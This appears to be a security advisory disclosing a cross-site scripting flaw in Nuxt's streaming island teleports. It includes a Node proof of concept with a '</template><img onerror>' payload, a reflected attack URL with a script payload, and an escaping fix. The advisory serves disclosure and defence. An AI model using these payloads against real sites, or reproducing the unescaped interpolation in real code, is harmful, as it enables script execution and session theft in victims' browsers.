# nuxt/nuxt: XSS via unescaped `</template>` in streaming island teleports

**Package**: nuxt
**Ecosystem**: npm
**Affected versions**: `>= 4.0.0` with `experimental.ssrStreaming.enabled: true`
**Patched versions**: none (unpatched as of 4.3.1)
**Severity**: High
**CVSS 3.1**: `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N` — **7.5**
**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)

## Summary

When SSR streaming is enabled, `renderStreamedIslandTeleports` writes island slot
content directly into `<template>` wrapper elements without encoding or escaping
`</template>` sequences. A `</template>` in the content causes the browser's HTML
parser to close the wrapper prematurely. Everything after the premature close is
parsed as live DOM instead of an inert `DocumentFragment`, so injected scripts and
event handlers execute before Vue hydration.

## Description

Nuxt's streaming renderer emits island teleport content as:

```html
<template data-island-uid="abc" data-island-slot="default">
  {teleportContent}
</template>
```

`teleportContent` is whatever Vue's SSR renderer produced for the slot — including
verbatim `v-html` output. The relevant code in
`packages/nitro-server/src/runtime/utils/renderer/islands.ts`:

```typescript
// line 91 — slot teleport, primary vector
templates += `<template data-island-uid="${uid}" data-island-slot="${slot}">${teleports[key]}</template>`

// line 84 — client component teleport, same issue
templates += `<template data-island-uid="${uid}" data-island-component="${clientId}">${teleports[key]}</template>`
```

`teleports[key]` is not sanitized at either site.

The HTML5 specification defines "in template" insertion mode: on encountering a
`</template>` end tag the parser pops the element from the open element stack and
switches back to normal insertion mode. Content parsed after that point is live DOM,
not the inert `DocumentFragment` that lives inside a `<template>`. Inline event
handlers on those elements fire immediately during parsing — before Vue's
`ISLAND_TELEPORT_RELOCATE_SCRIPT` runs, and before any nonce-based CSP can
intervene (nonces apply to `<script>` elements, not to `onerror`/`onload`).

## Attack Conditions

1. The application has `experimental.ssrStreaming.enabled: true` in `nuxt.config.ts`.
2. A `*.server.vue` island component exposes a named `<slot>`.
3. The slot renders user-supplied data via `v-html`.

All three conditions appear in production applications. Nuxt's own streaming test
fixture (`test/fixtures/ssr-streaming/components/IslandWithSlot.server.vue`) uses
named slots on island components.

## Proof of Concept

```javascript
// Replicates renderStreamedIslandTeleports from islands.ts:74-96 exactly.
// Run with: node poc.js

const SSR_SLOT_TELEPORT_MARKER   = /^uid=([^;]*);slot=(.*)$/
const SSR_CLIENT_TELEPORT_MARKER = /^uid=([^;]*);client=(.*)$/

const ISLAND_TELEPORT_RELOCATE_SCRIPT =
  `(()=>{for(const t of document.querySelectorAll('template[data-island-uid]')){` +
  `const u=t.getAttribute('data-island-uid'),s=t.getAttribute('data-island-slot'),` +
  `c=t.getAttribute('data-island-component'),` +
  `a=document.querySelector('[data-island-uid="'+u+'"]'+(s!==null?` +
  `'[data-island-slot="'+s+'"]':'[data-island-component="'+c+'"]'));` +
  `if(a){a.insertBefore(t.content,a.firstChild)}t.remove()}})()`

function renderStreamedIslandTeleports(ssrContext, nonceAttr = '') {
  const { teleports, islandContext } = ssrContext
  if (islandContext || !teleports) return ''
  let templates = ''
  for (const key in teleports) {
    const matchClientComp = key.match(SSR_CLIENT_TELEPORT_MARKER)
    if (matchClientComp) {
      const [, uid, clientId] = matchClientComp
      if (!uid || !clientId) continue
      templates += `<template data-island-uid="${uid}" data-island-component="${clientId}">${teleports[key]}</template>`
      continue
    }
    const matchSlot = key.match(SSR_SLOT_TELEPORT_MARKER)
    if (matchSlot) {
      const [, uid, slot] = matchSlot
      if (!uid || !slot) continue
      templates += `<template data-island-uid="${uid}" data-island-slot="${slot}">${teleports[key]}</template>`
    }
  }
  if (!templates) return ''
  return templates + `<script${nonceAttr}>${ISLAND_TELEPORT_RELOCATE_SCRIPT}</script>`
}

// Attacker payload — delivered via v-html="$route.query.comment"
const payload = '</template><img src=x onerror="document.title=\'XSS\'">'

const output = renderStreamedIslandTeleports({
  teleports: { 'uid=abc123;slot=default': `<p>safe content</p>${payload}` },
  islandContext: null
})

console.log(output)
// → <template ...><p>safe content</p></template><img src=x onerror="..."></template><script>...</script>
//                                               ^^^ parser exits template mode here; img is live DOM
```

Loading the output in a browser sets `document.title` to `"XSS"` before any Vue
code runs.

**Attack URL** (reflected variant):
```
https://example.com/?comment=%3C%2Ftemplate%3E%3Cscript%3Ealert(origin)%3C%2Fscript%3E
```

## Impact

Arbitrary JavaScript execution in the victim's browser context. Full session access
(cookies, storage, tokens). The XSS is server-rendered into the streaming response
and affects every user who loads the poisoned page.

## Mitigation

Escape `</template>` before interpolating teleport content:

```typescript
function escapeTemplateClose(s: string): string {
  return s.replace(/<\/template>/gi, '<\\/template>')
}

// line 91:
templates += `<template data-island-uid="${uid}" data-island-slot="${slot}">${escapeTemplateClose(teleports[key])}</template>`
```

Alternatively, transport teleport content through a Base64-encoded data attribute to
remove the dependency on HTML parser behaviour entirely.
